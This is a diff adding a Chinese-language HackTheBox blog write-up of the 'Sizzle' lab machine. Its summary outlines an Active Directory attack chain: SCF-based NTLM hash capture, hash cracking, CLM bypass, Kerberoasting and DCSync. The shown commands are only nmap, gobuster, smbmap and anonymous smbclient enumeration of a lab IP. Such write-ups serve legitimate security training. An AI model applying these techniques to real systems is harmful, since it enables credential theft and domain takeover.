@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Sizzle - T0x1c</title>
+
+  
+    <meta name="description" content="Sizzle是一个非常困难的靶机，知识点涉及smb匿名登陆、NTLM哈希获取、NTLM哈希破解、LDAP信息获取、WinRM登陆、绕过受限环境、Kerberoasting、DCSync等。在smb连接共享时发现对其中目录存在写入权限，上传scf文件获取NTLM哈希值，对哈希进行破解拿到账号密码，使用该账号密码登陆smb服务。通过LDAP信息获取到站点目录，登陆后发现其中存在证书生成界面。通过ope">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Sizzle">
+<meta property="og:url" content="https://toxic80l.github.io/post/2b6b41bb/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Sizzle是一个非常困难的靶机，知识点涉及smb匿名登陆、NTLM哈希获取、NTLM哈希破解、LDAP信息获取、WinRM登陆、绕过受限环境、Kerberoasting、DCSync等。在smb连接共享时发现对其中目录存在写入权限，上传scf文件获取NTLM哈希值，对哈希进行破解拿到账号密码，使用该账号密码登陆smb服务。通过LDAP信息获取到站点目录，登陆后发现其中存在证书生成界面。通过ope">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0320.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%888.45.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%889.03.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%889.03.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.18.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.21.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.28.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.42.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.43.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.47.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.14.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.28.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.31.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.36.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.41.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.59.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8810.02.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8811.45.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%8811.49.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8812.01.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.13.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.27.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.28.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.29.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.56.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%889.59.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.01.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.07.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.21.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.22.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.15.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.24.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8810.32.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8811.00.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8A%E5%8D%8811.26.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.01.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.13.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.17.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.07.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.28.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.52.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.00.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.01.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.10.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.14.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.38.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%884.40.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%885.41.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%885.56.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%886.18.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%886.19.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%8811.45.18.png">
+<meta property="article:published_time" content="2022-02-25T01:35:25.000Z">
+<meta property="article:modified_time" content="2022-02-25T08:58:17.917Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Kerberoasting">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="NTLM">
+<meta property="article:tag" content="WinRM">
+<meta property="article:tag" content="LDAP">
+<meta property="article:tag" content="Chisel">
+<meta property="article:tag" content="DCSync">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0320.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80-443%E7%AB%AF%E5%8F%A3"><span class="toc-text">80&#x2F;443端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-amanda"><span class="toc-text">0x02 上线[amanda]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96NTLM%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-text">获取NTLM哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E5%80%BC%E7%A0%B4%E8%A7%A3"><span class="toc-text">哈希值破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1"><span class="toc-text">登陆服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smb%E7%99%BB%E9%99%86"><span class="toc-text">smb登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-text">LDAP信息获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinRM%E7%99%BB%E9%99%86"><span class="toc-text">WinRM登陆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-mrlky"><span class="toc-text">0x03 权限提升[mrlky]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%8E%AF%E5%A2%83"><span class="toc-text">受限环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CLM"><span class="toc-text">绕过CLM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PSByPassCLM"><span class="toc-text">PSByPassCLM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rubeus"><span class="toc-text">Rubeus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Chisel%E8%BD%AC%E5%8F%91"><span class="toc-text">Chisel转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-text">NTLM哈希破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E7%99%BB%E9%99%86-1"><span class="toc-text">WinRM登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-administrator"><span class="toc-text">0x04 权限提升[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-text">尝试哈希破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-25T01:35:25.000Z">2022-02-25</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Sizzle</span></h1>
+<p>Sizzle是一个非常困难的靶机，知识点涉及smb匿名登陆、NTLM哈希获取、NTLM哈希破解、LDAP信息获取、WinRM登陆、绕过受限环境、Kerberoasting、DCSync等。在smb连接共享时发现对其中目录存在写入权限，上传scf文件获取NTLM哈希值，对哈希进行破解拿到账号密码，使用该账号密码登陆smb服务。通过LDAP信息获取到站点目录，登陆后发现其中存在证书生成界面。通过openssl生成密钥和证书签名请求，在网页中使用证书签名请求生成证书，有了证书以后我们就可以使用WinRM登陆靶机，但是命令行运行环境为受限模式，通过PSByPassCLM绕过CLM拿到未受限的powershell环境。借助 Chisel转发获取Kerberoast，之后将获取到NTLM哈希值进行破解同时拿到破解成功后的账号密码，再次使用openssl生成密钥和证书签名请求，登陆后使用证书签名请求生成证书，同样地再通过WinRM登陆另一用户完成首次权限提升。在其中使用DCSync从域控制器复制用户凭据，具体可使用secretsdump获取管理员凭据，最终通过wmiexec获取到管理员权限。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0320.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%888.45.05.png" alt="截屏2021-11-30 上午8.45.05"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.103 -oA nmap_Sizzle</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%889.03.06.png" alt="截屏2021-11-30 上午9.03.06"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8A%E5%8D%889.03.26.png" alt="截屏2021-11-30 上午9.03.26"><br>扫描结果显示目标开放了21、80、443、445等端口</p>
+<h4 id="80-443端口"><a href="#80-443端口" class="headerlink" title="80/443端口"></a>80/443端口</h4><p>分别访问80和443端口，对应的都是同一张烤肉图片，猜测为同一站点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.18.47.png" alt="截屏2021-11-30 下午8.18.47"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.21.13.png" alt="截屏2021-11-30 下午8.21.13"><br>对该站点进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.103 -w /usr/share/wordlists/dirb/big.txt -t 50</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.28.03.png" alt="截屏2021-11-30 下午8.28.03"><br>由于目录扫描常报错，最终整理后存在以下几个目录</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">index.html</span></span><br><span class="line"><span class="string">certenroll</span></span><br></pre></td></tr></table></figure>
+<p>访问<code>/certenroll</code>目录则界面显示403</p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>使用 smbmap 进行对 smb 服务进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.103</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.42.08.png" alt="截屏2021-11-30 下午8.42.08"><br>使用 smbclient 探测默认共享，发现如下共享名称</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.103</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.43.58.png" alt="截屏2021-11-30 下午8.43.58"><br>对其中各个共享名称进行访问，在共享<code>SYSVOL</code>中能够连接 smb 服务，遗憾的是无法执行命令 dir </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N //10.10.10.103/SYSVOL</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%888.47.06.png" alt="截屏2021-11-30 下午8.47.06"><br>尝试收集扫描到的共享名称并循环扫描，而命令中的 sed 主要用于匹配正则表达式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.103 | grep Disk | sed <span class="string">&#x27;s/^\s*\(.*\)\s*Disk.*/\1/&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.14.51.png" alt="截屏2021-11-30 下午9.14.51"><br>通过正则匹配网站我们可以知道以上表达式匹配了什么<br><em><strong>网站地址：<a target="_blank" rel="noopener" href="https://regex101.com/r/ageDvh/1">https://regex101.com/r/ageDvh/1</a></strong></em><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.28.36.png" alt="截屏2021-11-30 下午9.28.36"></p>
+<p>查看正则匹配结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.103 | grep Disk | sed <span class="string">&#x27;s/^\s*\(.*\)\s*Disk.*/\1/&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> share; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;======<span class="variable">$&#123;share&#125;</span>======&quot;</span>; smbclient -N <span class="string">&quot;//10.10.10.103/<span class="variable">$&#123;share&#125;</span>&quot;</span> -c dir; <span class="built_in">echo</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-11-30%20%E4%B8%8B%E5%8D%889.31.56.png" alt="截屏2021-11-30 下午9.31.56"><br>结果显示只有<code>Department Shares</code>存在多个目录，其他共享名连接失败或无法查看</p>
+<p>将共享挂载到<code>\mnt</code>下便可以轻松访问</p>
